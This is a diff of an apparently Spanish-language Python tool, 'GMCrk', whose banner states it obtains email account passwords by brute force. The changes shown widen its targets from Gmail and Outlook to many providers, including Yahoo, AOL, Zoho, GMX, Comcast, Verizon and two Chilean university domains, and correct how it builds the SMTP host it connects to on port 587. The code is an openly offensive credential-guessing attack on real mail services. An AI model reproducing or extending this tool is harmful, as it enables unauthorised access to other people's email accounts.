@@ -21,12 +21,12 @@ os.system('cls')
 
 
 autor = "By: LawlietJH"
-version = "v_1.0.4"
+version = "v_1.0.5"
 
 #GMCrk - Banner Random
-banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n")
+banner = str(Banner()+"\n\n\t [-] Obten Contraseñas de Cuentas de Correos Por Fuerza Bruta [-] \n")
 print (banner)
- 
+
 def Correo():
 	
 	global sufijo
@@ -44,9 +44,37 @@ def Correo():
 	# pero lo tomaria como valido.
 	
 	if Usuario.lower().endswith('@gmail.com'):
-		sufijo = "gmail"
+		sufijo = "gmail.com"
 	elif Usuario.lower().endswith('@hotmail.com'):
-		sufijo = "outlook"
+		sufijo = "outlook.com"
+	elif Usuario.lower().endswith('@zoho.com'):
+		sufijo = "zoho.com"
+	elif Usuario.lower().endswith('@yahoo.com'):
+		sufijo = "mail.yahoo.com"
+	elif Usuario.lower().endswith('@ymail.com'):
+		sufijo = "mail.yahoo.com"
+	elif Usuario.lower().endswith('@roketmail.com'):
+		sufijo = "mail.yahoo.com"
+	elif Usuario.lower().endswith('@gmx.es'):
+		sufijo = "gmx.es"
+	elif Usuario.lower().endswith('@live.com'):
+		sufijo = "live.com"
+	elif Usuario.lower().endswith('@aol.com'):
+		sufijo = "aol.com"
+	elif Usuario.lower().endswith('@housemusic.com'):
+		sufijo = "housemusic.com"
+	elif Usuario.lower().endswith('@rediffmail.com'):
+		sufijo = "rediffmail.com"
+	elif Usuario.lower().endswith('@comcast.net'):
+		sufijo = "comcast.net"
+	elif Usuario.lower().endswith('@web.de'):
+		sufijo = "web.de"
+	elif Usuario.lower().endswith('@verizon.net'):
+		sufijo = "verizon.net"
+	elif Usuario.lower().endswith('@upla.cl'):
+		sufijo = "upla.cl"
+	elif Usuario.lower().endswith('@udec.cl'):
+		sufijo = "udec.cl"
 	else:
 		print("\n\t\t [!] Correo No Valido.")
 		os.system('Timeout /nobreak 02 > Nul')
@@ -114,8 +142,8 @@ def Conexion():
 	global Archivo
 	global Usuario
 	
-	#SMTP Puerto 587/TCP (Para Clientes de Correo)
-	smtpserver = smtplib.SMTP("smtp."+str(sufijo)+".com", 587)
+	#SMTP Puerto 587/TCP (Para Clientes de Correo). Otros SMTP: 25 y 645.
+	smtpserver = smtplib.SMTP("smtp."+str(sufijo), 587)
 	smtpserver.ehlo()
 	smtpserver.starttls()
 
